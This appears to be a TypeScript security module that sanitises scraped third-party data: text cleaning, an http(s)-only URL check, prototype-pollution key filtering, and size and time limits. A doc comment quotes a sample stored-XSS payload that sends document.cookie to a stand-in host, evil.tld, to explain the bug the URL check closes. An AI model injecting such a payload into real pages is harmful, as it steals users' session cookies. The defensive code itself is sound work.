/**
 * Safety primitives for data crossing a trust boundary.
 *
 * Everything a source adapter returns is ATTACKER-CONTROLLED. A campaign name,
 * a URL and a brand string are all written by someone else, on someone else's
 * site, and they end up in our database and then on our page. Treat every
 * field as hostile input, because a compromised or malicious upstream is a
 * realistic way to attack us.
 */

/** Cap on any single text field we persist from a third party. */
const MAX_TEXT = 300;
/** Cap on a raw payload blob stored to jsonb. */
const MAX_PAYLOAD_BYTES = 16_000;
/** Cap on an upstream HTTP response we will parse at all. */
export const MAX_RESPONSE_BYTES = 8_000_000;
/** How long we will wait on any upstream before giving up. */
export const FETCH_TIMEOUT_MS = 20_000;

/**
 * Strip control characters and clamp length.
 *
 * Control chars (including bidi overrides) can spoof how a string renders —
 * a campaign called "Nova‮gnippilc" displays reversed. Cheap to remove.
 */
export function cleanText(value: unknown, max = MAX_TEXT): string | null {
  if (typeof value !== 'string') return null;
  const cleaned = value
    .replace(/[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u202A-\u202E\u2066-\u2069]/g, '')
    .trim();
  if (cleaned.length === 0) return null;
  return cleaned.slice(0, max);
}

/**
 * Only http(s) URLs survive.
 *
 * THE VULNERABILITY THIS CLOSES: a scraped campaign whose url is
 * `javascript:fetch('https://evil.tld?c='+document.cookie)` gets stored, then
 * rendered on our board as <a href="...">. One click on our own site runs
 * their script. `data:` and `vbscript:` are the same class of bug. This is
 * stored XSS with the payload delivered by a third party we do not control.
 */
export function safeUrl(value: unknown, base?: string): string | null {
  if (typeof value !== 'string') return null;
  const raw = value.trim();
  if (raw.length === 0 || raw.length > 2000) return null;

  let parsed: URL;
  try {
    parsed = base ? new URL(raw, base) : new URL(raw);
  } catch {
    return null;
  }

  if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return null;
  // Credentials in a URL are never legitimate here and can be used to phish.
  if (parsed.username || parsed.password) return null;
  return parsed.toString();
}

/**
 * Reject the keys that let a crafted JSON body walk up the prototype chain.
 *
 * JSON.parse does not itself set a prototype, but the moment that object is
 * merged, spread or assigned into another one, a `__proto__` key can land
 * somewhere it matters. Cheaper to drop the keys than to audit every merge.
 */
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

export function sanitizeObject(input: unknown, depth = 0): Record<string, unknown> | null {
  if (depth > 6 || input === null || typeof input !== 'object' || Array.isArray(input)) return null;

  const out: Record<string, unknown> = Object.create(null);
  for (const [key, value] of Object.entries(input as Record<string, unknown>)) {
    if (FORBIDDEN_KEYS.has(key)) continue;
    if (value === null || ['string', 'number', 'boolean'].includes(typeof value)) {
      out[key] = typeof value === 'string' ? value.slice(0, 2000) : value;
    } else if (Array.isArray(value)) {
      out[key] = value.slice(0, 50);
    } else if (typeof value === 'object') {
      const nested = sanitizeObject(value, depth + 1);
      if (nested) out[key] = nested;
    }
  }
  return { ...out };
}

/** Clamp what we persist to jsonb so one bloated upstream row can't fill the disk. */
export function clampPayload(payload: unknown): unknown {
  if (payload == null) return null;
  const json = JSON.stringify(payload);
  if (json === undefined) return null;
  return json.length > MAX_PAYLOAD_BYTES ? { truncated: true, bytes: json.length } : payload;
}

/**
 * fetch() with a timeout and a hard body cap.
 *
 * Plain fetch has NO default timeout: one upstream that accepts the connection
 * and never responds hangs the ingest run forever, and every later run behind
 * it. An unbounded body is the same story for memory.
 */
export async function safeFetchJson(url: string, init: RequestInit = {}): Promise<unknown> {
  const target = safeUrl(url);
  if (!target) throw new Error(`refusing to fetch non-http(s) url`);

  const res = await fetch(target, {
    ...init,
    signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
    redirect: 'follow',
  });

  if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);

  const declared = Number(res.headers.get('content-length') ?? 0);
  if (declared > MAX_RESPONSE_BYTES) throw new Error(`response too large (${declared} bytes)`);

  const text = await res.text();
  if (text.length > MAX_RESPONSE_BYTES) throw new Error(`response too large (${text.length} bytes)`);

  return JSON.parse(text);
}

/** Bound a timestamp to a sane window so bad data can't skew the scoring. */
export function boundedDate(value: unknown, opts: { pastDays: number; futureDays: number }): string | null {
  if (value == null) return null;
  const d = new Date(value as string);
  if (Number.isNaN(d.getTime())) return null;
  const now = Date.now();
  if (d.getTime() < now - opts.pastDays * 86_400_000) return null;
  if (d.getTime() > now + opts.futureDays * 86_400_000) return null;
  return d.toISOString();
}
